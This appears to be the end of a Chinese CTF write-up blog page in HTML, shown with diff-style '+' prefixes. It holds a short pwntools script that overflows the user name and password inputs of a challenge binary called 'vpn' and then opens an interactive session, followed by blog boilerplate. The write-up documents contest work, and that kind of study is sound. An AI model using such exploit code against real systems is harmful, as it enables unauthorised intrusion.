+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]</span><br><span class="line">context.binary = <span class="string">'./vpn'</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">	p = remote(<span class="string">'219.219.61.234'</span>,<span class="string">'20007'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(<span class="string">'./vpn'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./vpn'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input your user name\n'</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">0x100</span>)</span><br><span class="line">p.sendafter(<span class="string">'input your password\n'</span>,<span class="string">'b'</span>*<span class="number">0x100</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input your user name\n'</span>)</span><br><span class="line">p.send(<span class="string">'\x00'</span>)</span><br><span class="line">p.sendafter(<span class="string">'input your password\n'</span>,<span class="string">'\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2020-11-23T13:36:36.569Z" itemprop="dateUpdated">2020-11-23 21:36:36</time>
+</span>
+
+
+        
+        原文链接：<a href="/2020/10/23/%E5%8D%8E%E4%B8%BA%E6%9D%AF/" target="_blank" rel="external">https://github.com/gha01un/gha01un.github.io/2020/10/23/%E5%8D%8E%E4%B8%BA%E6%9D%AF/</a>
+        
+    </div>
+    <footer>
+        <div onclick="location.href='https://github.com/gha01un/gha01un.github.io'">
+            <img src="https://i.loli.net/2020/06/03/obm8dYauEDhsfFr.jpg" alt="Mr.Guo">
+            <a>Mr.Guo</a>
+        </div>
+    </footer>
+</blockquote>
+
+        
+    <div class="page-reward">
+        <nav class="myreward">
+            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
+        </nav>
+    </div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RE/" rel="tag">RE</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://github.com/gha01un/gha01un.github.io/2020/10/23/%E5%8D%8E%E4%B8%BA%E6%9D%AF/&title=《CUMTCTF2020-WP by Q1RG》 — Mr.Guo&pic=https://i.loli.net/2020/06/03/obm8dYauEDhsfFr.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://github.com/gha01un/gha01un.github.io/2020/10/23/%E5%8D%8E%E4%B8%BA%E6%9D%AF/&title=《CUMTCTF2020-WP by Q1RG》 — Mr.Guo&source=2020 华为杯" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://github.com/gha01un/gha01un.github.io/2020/10/23/%E5%8D%8E%E4%B8%BA%E6%9D%AF/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《CUMTCTF2020-WP by Q1RG》 — Mr.Guo&url=https://github.com/gha01un/gha01un.github.io/2020/10/23/%E5%8D%8E%E4%B8%BA%E6%9D%AF/&via=https://github.com/gha01un/gha01un.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://github.com/gha01un/gha01un.github.io/2020/10/23/%E5%8D%8E%E4%B8%BA%E6%9D%AF/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2020/10/26/sql%E6%B3%A8%E5%85%A5---%E4%BB%8E0%E5%BC%80%E5%A7%8B%E6%90%AD%E7%BD%91%E7%AB%99/" id="post-prev" class="post-nav-link">
+        <h4 class="title" >
+          上一篇：sql注入---从0开始搭网站
+        </h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/10/14/sql%E6%B3%A8%E5%85%A5---sqlmap%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/" id="post-next" class="post-nav-link">
+        <h4 class="title" data-hover="下一篇：简单的SQL注入">下一篇：简单的SQL注入</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+    
+
+    
+
+    
+    <!-- Valine Comments -->
+    <div class="comments vcomment" id="comments"></div>
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script>
+    <!-- Valine Comments script -->
+    <script>
+        var GUEST_INFO = ['nick','mail','link'];
+        var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+          return GUEST_INFO.indexOf(item) > -1
+        });
+        new Valine({
+            el: '#comments',
+            notify: 'false' == 'true',
+            verify: 'false' == 'true',
+            appId: "3nztltfuvNfYN4yV7zxv4h8U-gzGzoHsz",
+            appKey: "CGxu9DylhaTiqe09F5FkEJzb",
+            avatar: "wavatar",
+            placeholder: "Just go go",
+            guest_info: guest_info.length == 0 ? GUEST_INFO : guest_info,
+            pageSize: "10"
+        })
+    </script>
+    <!-- Valine Comments end -->
+
+
+
+</article>
+
+</div>
+
+        <footer class="footer">
+    <div class="footer-content">
+        <span class="power">
+            <i class="icon icon-lg icon-copyright"></i>
+            2020
+            <i class="icon icon-lg icon-heart"></i>
+            <a href="https://github.com/gha01un/gha01un.github.io">gha01un.github.io</a>
+            <br/>
+            Power by
+            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
+            Theme
+            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
+        </span>
+
+        <br/>
+    
+        <span id="RunTime" style="color:#a7a7a2;"></span>
+        <br/>
+    
+        <span>
+            
+	<i class="icon icon-lg icon-user">
+<span id="busuanzi_container_site_uv" style='display:none'>
+       访问用户：<span id="busuanzi_value_site_uv"></span>
+    </span>人</i>
+    ·
+    <i class="icon icon-lg icon-eye">
+    <span id="busuanzi_container_site_pv" style='display:none'>
+      访问次数：<span id="busuanzi_value_site_pv"></span>
+    </span>次
+    </i>
+
+
+        </span>
+        <br/>
+    
+        <span class="license">This blog is licensed under a <a rel="license noopener" rel="external nofollow noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
+    </div>
+</footer>
+
+```
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+```
+    </main>
+    
+        
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        <span>感谢您的鼓励支持！</span>
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" data-img="https://i.loli.net/2020/06/04/2I7aueljzb9xypn.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="https://i.loli.net/2020/06/04/2I7aueljzb9xypn.jpg" data-alipay="https://i.loli.net/2020/06/04/7lT5ihFeUxEYBLO.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
+                <span class="reward-toggle-item alipayPay">支付宝</span>
+            </div>
+        </label>
+        
+        <i class="icon icon-caret-up"></i>
+    </div>
+</div>
+
+
+    
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://github.com/gha01un/gha01un.github.io/2020/10/23/%E5%8D%8E%E4%B8%BA%E6%9D%AF/&title=《CUMTCTF2020-WP by Q1RG》 — Mr.Guo&pic=https://i.loli.net/2020/06/03/obm8dYauEDhsfFr.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://github.com/gha01un/gha01un.github.io/2020/10/23/%E5%8D%8E%E4%B8%BA%E6%9D%AF/&title=《CUMTCTF2020-WP by Q1RG》 — Mr.Guo&source=2020 华为杯" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://github.com/gha01un/gha01un.github.io/2020/10/23/%E5%8D%8E%E4%B8%BA%E6%9D%AF/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《CUMTCTF2020-WP by Q1RG》 — Mr.Guo&url=https://github.com/gha01un/gha01un.github.io/2020/10/23/%E5%8D%8E%E4%B8%BA%E6%9D%AF/&via=https://github.com/gha01un/gha01un.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://github.com/gha01un/gha01un.github.io/2020/10/23/%E5%8D%8E%E4%B8%BA%E6%9D%AF/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p class="wechatshare">扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://github.com/gha01un/gha01un.github.io/2020/10/23/%E5%8D%8E%E4%B8%BA%E6%9D%AF/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <!-- waves按钮特效 -->
+<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<!-- 主题配置脚本 -->
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+</script>
+
+<!-- jquery -->
+<script src="/js/jquery.min.js?v=3.0"></script>
+
+<!-- 搜索 -->
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item waves-block waves-effect" onclick="location.href='{path}'">
+    <div class="title ellipsis" title="{title}">{title}</div>
+</li>
+</template>
+
+
+<!-- main博客脚本 -->
+<script src="/js/main.min.js?v=3.0" ></script>
+
+<!-- 动画&配置 -->
+<script src="/js/script.min.js?v=3.0" ></script>
+
+<!-- 脚本管理 -->
+<script>
+if(window.innerWidth > 600){
+	/* 3D标题 */
+	$(".content-header").on("mousemove", threedee);
+
+	/* 底部追随鼠标 */
+	$(".footer").hover(2);
+	
+	/* gotop键的涟漪 */
+	$("#gotop").hover(1);
+	
+	/* 赞赏的粒子雨 */
+	$("#reward").hover(3);
+	
+	/* 微信公众号的底部渲染 */
+	$("#wechat").hover(4);
+	
+	/* 标题跳动 */
+	$(".archivestitle").bumpyText();
+	
+	/* 图片点击放大 */
+	const postimg = jQuery(".post-content img:not(.github-emoji)");
+	postimg.on("click",function(){
+	
+		mask.classList.add("in");
+		main.classList.add("Mask");
+		menu.classList.add("Mask");
+		var myimg = this.cloneNode(true);
+		myimg.classList.add("imgShow");
+	
+		setTimeout(function(){
+			jQuery(myimg).animate({
+				opacity:"1"
+			},1000);
+		},0);
+	
+		document.body.appendChild(myimg);
+	
+		myimg.onclick=function(){
+			document.body.removeChild(myimg);
+			mask.classList.remove("in");
+			main.classList.remove("Mask");
+			menu.classList.remove("Mask");
+		};
+	
+	});
+
+}
+
+/* 名字跳动 */
+$("#name").bumpyText();
+
+
+/* 网站运行时间 */
+setInterval(function () {
+	setTime("2020/1/22");
+}, 1000);
+
+/* 文章块的淡出 */
+postshow();
+
+/* 座右铭 */
+
+   getHitokoto();
+
+
+
+/* 粘贴提示 */
+G($(".post-content"), location.href, "Mr.Guo");
+
+/* 控制台 */
+if (window.console && window.console.log) {
+	setTimeout(function () {
+		console.log("\n %c 36.5网友小郭 %c  © Mr. Guo  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
+	}, 0);
+}
+
+</script>
+
+
+
+
+<!-- 公式渲染 -->
+
+
+
+<!-- 不蒜子 -->
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+<!-- 引入jquery 已经引入过了可去掉 -->
+<script type="text/javascript" src="//libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+
+<!-- 雪花特效 -->
+<script type="text/javascript">
+  var windowWidth = $(window).width();
+  if (windowWidth > 480) {
+    document.write('<script type="text/javascript" src="/js/snow.js"><\/script>');
+  }
+</script>
+</body>
+</html>
